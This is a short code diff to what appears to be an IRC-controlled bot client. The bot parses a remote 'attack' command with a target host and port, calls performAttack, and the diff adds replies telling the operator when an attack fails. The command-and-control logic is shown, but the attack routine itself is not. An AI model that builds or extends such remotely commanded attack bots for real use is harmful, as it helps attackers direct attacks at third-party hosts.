@@ -208,10 +208,15 @@ class Bot:
                             port = int(msgParts[3])
                             if port >= 1 and port <= 65535:
                                 host = self.domain_resolution(unres_host)
+                                
                                 self.performAttack(host, port, sender)
                             else:
+                                response = "PRIVMSG {0} :{1}\r\n".format(sender, "attack failed, invalid port").encode('utf-8')
+                                self.logSend(response)
                                 eprint("Ignoring attack command. Port not between 1 and 65535.")
                         except:
+                            response = "PRIVMSG {0} :{1}\r\n".format(sender, "attack failed, no such hostname").encode('utf-8')
+                            self.logSend(response)
                             eprint(traceback.format_exc())
                             eprint("Something went wrong. Ignoring attack command")
                     else:
